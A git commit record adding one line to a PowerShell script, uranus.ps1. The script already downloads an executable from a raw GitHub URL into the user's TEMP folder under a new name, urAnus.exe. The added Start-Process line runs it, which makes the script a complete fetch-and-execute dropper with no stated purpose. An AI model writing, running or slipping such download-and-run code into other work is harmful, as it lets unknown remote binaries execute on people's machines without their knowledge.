5551a3cd1c1164c6534d87f8dedc7d4272527e00
mhwcarter <mhw.carter@gmail.com>
2024-10-25 13:00:55 +0800

    Update uranus.ps1

--- uranus.ps1
+++ uranus.ps1
@@ -1,2 +1,3 @@
 $exeUrl = "https://raw.githubusercontent.com/mhwcarter/ur-nus/calc.exe"
 $exeBytes = iwr -Uri $exeUrl -UseBasicParsing -OutFile "$env:TEMP\urAnus.exe"
+Start-Process "$env:TEMP\urAnus.exe"
